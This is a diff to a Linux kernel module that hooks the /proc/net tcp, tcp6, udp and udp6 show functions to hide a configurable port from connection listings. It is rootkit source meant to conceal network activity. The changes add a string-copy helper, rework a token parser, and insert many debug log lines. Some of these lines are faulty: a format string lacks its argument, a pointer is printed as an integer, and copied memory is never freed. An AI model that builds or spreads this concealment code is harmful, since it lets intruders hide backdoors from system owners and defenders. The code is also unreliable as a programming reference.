@@ -6,14 +6,10 @@
 #include <net/udp.h>
 #include <linux/string.h>
 
-/*from net/ipv4/tcp_ipv4.c*/
 #define TCP_SIZE 150
 #define TCP6_SIZE 177
 #define UDP_SIZE 128
 #define UDP6_SIZE 167
-
-//#define PORT_TO_HIDE 9999
-
 
 static int port = 9999;
 module_param(port, int, S_IRUGO);
@@ -43,17 +39,30 @@ struct proc_dir_entry {
 		char name[];
 };
 
+char *strdup(const char *str)
+{
+    int n = strlen(str) + 1;
+    char *dup = kmalloc(n, GFP_KERNEL);
+    if(dup)
+    {
+        strcpy(dup, str);
+    }
+    return dup;
+}
+
 char * shouldHide(char * string, const char * port) {
     	char * token = "";
+	char * copy = strdup(string);
 	int i;
+	printk(KERN_INFO "HIDE PORT SUBSTR: %s");
     	for(i = 0; i < 3 && token != NULL; i++) {
-        	token = strsep(&string, ":");
-        	//printf("Token: %s\n", token);
+        	token = strsep(&copy, ":");
     	}
-        //printf("Exited: %s\n",token);
-        if(token != NULL)
+	printk(KERN_INFO "HIDE PORT TOKEN: %s", token);
+        if(token != NULL) {
                 return strstr(strsep(&token, " "), port);
-        else
+        }
+	else
                 return NULL;
 }
 
@@ -73,8 +82,8 @@ char *strnstr(const char *haystack, const char *needle, size_t n)
 		
 	if (s == NULL)
 		return NULL;
-        //if (s-haystack+strlen(needle) <= n){
-	if(shouldHide(haystack,needle) != NULL) {
+        if (s-haystack+strlen(needle) <= n) {
+	//if(s != NULL) {
 		printk(KERN_INFO "HIDE PORT FOUND");
                 return s;
 	}
@@ -89,9 +98,18 @@ int hacked_tcp4_seq_show(struct seq_file *seq, void *v)
         char hex_port[12];
 
         sprintf(hex_port, "%x",port);
-
-        if(strnstr(seq->buf+seq->count-TCP_SIZE,hex_port,TCP_SIZE))
+	
+	printk(KERN_INFO "HIDE PORT DEBUG BEFORE: %s", seq->buf+seq->count-TCP_SIZE);
+	printk(KERN_INFO "HIDE PORT COUNT BEFORE: %lu", seq->count);
+	printk(KERN_INFO "HIDE PORT PTR BEFORE: %i", seq->buf);
+        //if(strnstr(seq->buf+seq->count-TCP_SIZE,hex_port,TCP_SIZE)) {
+	if(shouldHide(seq->buf+seq->count-TCP_SIZE, hex_port) != NULL) {
+		printk(KERN_INFO "HIDE PORT FOUND");
 	        seq->count -= TCP_SIZE;
+	}
+	printk(KERN_INFO "HIDE PORT DEBUG BEFORE: %s", seq->buf+seq->count-TCP_SIZE);
+	printk(KERN_INFO "HIDE PORT COUNT AFTER: %lu", seq->count);
+	printk(KERN_INFO "HIDE PORT PTR AFTER: %i\n\n", seq->buf);	
 	return retval;   
 }
 
@@ -104,6 +122,7 @@ int hacked_tcp6_seq_show(struct seq_file *seq, void *v)
         sprintf(hex_port, "%x",port);
 
         if(strnstr(seq->buf+seq->count-TCP6_SIZE,hex_port,TCP6_SIZE))
+	//if(shouldHide(seq->buf, hex_port) != NULL)
 	        seq->count -= TCP6_SIZE;
 	return retval;   
 }
@@ -117,7 +136,8 @@ int hacked_udp4_seq_show(struct seq_file *seq, void *v)
         sprintf(hex_port, "%x",port);
 
         if(strnstr(seq->buf+seq->count-UDP_SIZE,hex_port,UDP_SIZE))
-	        seq->count -= UDP_SIZE;
+	//if(shouldHide(seq->buf, hex_port) != NULL) 
+	       seq->count -= UDP_SIZE;
 	return retval;   
 }
 
@@ -130,6 +150,7 @@ int hacked_udp6_seq_show(struct seq_file *seq, void *v)
         sprintf(hex_port, "%x",port);
 
         if(strnstr(seq->buf+seq->count-UDP6_SIZE,hex_port,UDP6_SIZE))
+	//if(shouldHide(seq->buf, hex_port) != NULL)
 	        seq->count -= UDP6_SIZE;
 	return retval;   
 }
@@ -153,7 +174,6 @@ static int __init myinit(void)
 
 	while (proc_rb_nodeptr != proc_rb_last) {
 		proc_dir_entryptr = rb_entry(proc_rb_nodeptr, struct proc_dir_entry, subdir_node);
-		printk(KERN_INFO "HIDE PORT: DIR %s", proc_dir_entryptr->name);
 		if (!strcmp(proc_dir_entryptr->name, "tcp")) {
 			tcp_seq = proc_dir_entryptr->data;
 			old_tcp4_seq_show = tcp_seq->seq_ops.show;
